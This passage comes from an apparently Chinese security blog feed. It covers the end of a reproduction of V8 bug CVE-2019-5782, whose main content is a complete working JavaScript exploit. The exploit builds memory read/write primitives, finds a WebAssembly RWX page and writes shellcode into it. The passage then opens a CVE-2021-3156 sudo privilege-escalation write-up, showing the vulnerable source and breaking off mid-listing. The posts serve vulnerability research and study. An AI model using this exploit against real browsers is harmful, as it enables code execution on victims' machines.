    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0n</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">write64</span><span class="token punctuation">(</span>rwx_page_addr <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">,</span> sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成功弹出计算器：<br><img src="/images/696ac724/pasted-16.png" alt="upload successful"></p>
<p>生成 shellcode 的脚本同样可以参考之前的文章 <a href="/3b546c3b">starctf oob 复现</a></p>
<h2 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h2><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> fi_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> i_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
	<span class="token keyword">return</span> i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
	<span class="token keyword">return</span> f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span><span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%OptimizeFunctionOnNextCall(fun);</span>

<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//console.log(a2.length);</span>
<span class="token comment">//%DebugPrint(a1);</span>
<span class="token comment">//%DebugPrint(a2);</span>
<span class="token comment">//%SystemBreak();</span>



<span class="token keyword">var</span> objLeak <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'leak'</span><span class="token operator">:</span> <span class="token number">0x1234</span><span class="token punctuation">,</span> <span class="token string">'tag'</span><span class="token operator">:</span> <span class="token number">0x4567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> offset_leak <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x456700000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		offset_leak <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'offset_leak = '</span> <span class="token operator">+</span> offset_leak<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	objLeak<span class="token punctuation">.</span>leak <span class="token operator">=</span> obj<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>offset_leak<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">var</span> objTest <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'aaa'</span><span class="token operator">:</span> <span class="token number">123</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>


<span class="token comment">//%DebugPrint(objTest);</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'addressOf(objTest) = 0x'</span> <span class="token operator">+</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%SystemBreak();</span>


<span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> offset_backing_store <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token comment">//%DebugPrint(buf2write);</span>
<span class="token comment">//%SystemBreak();</span>


<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbeef</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		offset_backing_store <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>data_view<span class="token punctuation">.</span><span class="token function">getFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



<span class="token function">write64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token number">0x2333n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%DebugPrint(objTest);</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'value = 0x'</span> <span class="token operator">+</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%SystemBreak();</span>


<span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

<span class="token comment">//%DebugPrint(f);</span>
<span class="token comment">//%SystemBreak();</span>



<span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>instance_addr <span class="token operator">+</span> <span class="token number">0xe8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0n</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">write64</span><span class="token punctuation">(</span>rwx_page_addr <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">,</span> sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/">https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/</a></li>
<li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></li>
<li><a href="https://xz.aliyun.com/t/5712">https://xz.aliyun.com/t/5712</a></li>
<li><a href="https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/">https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/</a></li>
<li><a href="https://cy2cs.top/2020/06/24/%E8%BF%91%E6%9C%9F%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%A4%E4%B8%AA-v8-%E6%BC%8F%E6%B4%9E/">https://cy2cs.top/2020/06/24/%E8%BF%91%E6%9C%9F%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%A4%E4%B8%AA-v8-%E6%BC%8F%E6%B4%9E/</a></li>
<li><a href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E">https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E</a>!</li>
<li><a href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04">https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04</a></li>
</ul>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-3156</title>
    <url>/b941c294/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>CVE-2021-3156 sudo 提权漏洞，复现过程总结</p>
<span id="more"></span>

<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul>
<li>系统：Ubuntu 20.04</li>
<li>sudo: sudo-1.8.31</li>
</ul>
<p>源码下载：<a href="https://mirrors.ustc.edu.cn/ubuntu/pool/main/s/sudo/sudo_1.8.31.orig.tar.gz">https://mirrors.ustc.edu.cn/ubuntu/pool/main/s/sudo/sudo_1.8.31.orig.tar.gz</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以参照一下官方的修复方式：<br><a href="https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8">https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8</a></p>
<p>找到 1.8.31 版本源码的漏洞位置如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//plugins/sudoers/sudoers.c</span>
<span class="token comment">//set_cmnd()</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

   <span class="token number">819</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>sudo_mode <span class="token operator">&amp;</span> <span class="token punctuation">(</span>MODE_RUN <span class="token operator">|</span> MODE_EDIT <span class="token operator">|</span> MODE_CHECK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token number">845</span>
   <span class="token number">846</span>          <span class="token comment">/* set user_args */</span>
   <span class="token number">847</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>NewArgc <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">848</span>              <span class="token keyword">char</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">;</span>
   <span class="token number">849</span>              <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> n<span class="token punctuation">;</span>
   <span class="token number">850</span>
   <span class="token number">851</span>              <span class="token comment">/* Alloc and build up user_args. */</span>
   <span class="token number">852</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span>
   <span class="token number">853</span>                  size <span class="token operator">+=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>av<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token number">854</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">855</span>                  <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">856</span>                  <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token number">857</span>              <span class="token punctuation">&#125;</span>
   <span class="token number">858</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_SHELL<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token number">859</span>                  <span class="token comment">/*
   860                   * When running a command via a shell, the sudo front-end
   861                   * escapes potential meta chars.  We unescape non-spaces
   862                   * for sudoers matching and logging purposes.
   863                   */</span>
   <span class="token number">864</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>from <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
